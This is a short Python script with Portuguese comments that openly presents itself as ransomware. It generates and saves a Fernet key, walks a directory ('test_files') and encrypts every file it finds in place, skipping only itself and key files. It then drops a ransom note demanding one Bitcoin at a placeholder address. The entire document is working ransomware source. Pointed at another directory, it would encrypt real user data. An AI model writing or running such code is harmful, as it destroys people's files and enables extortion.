# vamos criar um ransomware, que embaralha e criptografa arquiivos
from cryptography.fernet import Fernet
import os

# Gerar uma chave de criptografia e salvar

def geraChave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# carregar a chave salva
def carregaChave():
    return open("chave.key", "rb").read()

# criptografar arquivos
def criptografaArquivos(arquivo,chave):    
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dadosCriptografados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dadosCriptografados)

# encontrar arquivos no diretório atual e criptografar
def encontraArquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista


# mensagem de resgate
def criarMensagem():
    with open("LEIA-ME.txt", "w") as file:
        file.write("Seus arquivos foram criptografados! Para recuperá-los, envie 1 Bitcoin para o endereço XYZ e entre em contato com o suporte.")

# exec
def main():
    geraChave()
    chave = carregaChave()
    arquivos = encontraArquivos("test_files")
    for arquivo in arquivos:
        criptografaArquivos(arquivo, chave)
    criarMensagem()

    print("ransomware executado")

if __name__ == "__main__":
    main()